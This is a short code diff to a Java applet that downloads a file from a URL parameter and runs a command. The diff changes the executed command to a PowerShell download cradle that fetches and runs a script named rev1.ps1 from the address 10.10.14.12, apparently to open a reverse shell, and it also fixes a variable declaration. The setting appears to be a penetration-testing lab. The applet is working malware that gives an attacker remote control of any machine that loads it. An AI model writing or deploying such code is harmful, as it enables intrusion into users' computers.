@@ -19,7 +19,7 @@ public class Java extends Applet {
             download = getParameter("1");
             if (download.length() > 0) {
                 // URL parameterURL 
-                url = new URL(download);
+                URL url = new URL(download);
                 // Get an input stream for reading
                 InputStream in = url.openStream();
                 // Create a buffered input stream for efficency
@@ -34,7 +34,7 @@ public class Java extends Applet {
                 }
                 out.flush();
                 out.close(); in .close();
-                f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
+                f = Runtime.getRuntime().exec("cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')");
             }
         } catch (IOException e) {
             e.printStackTrace();
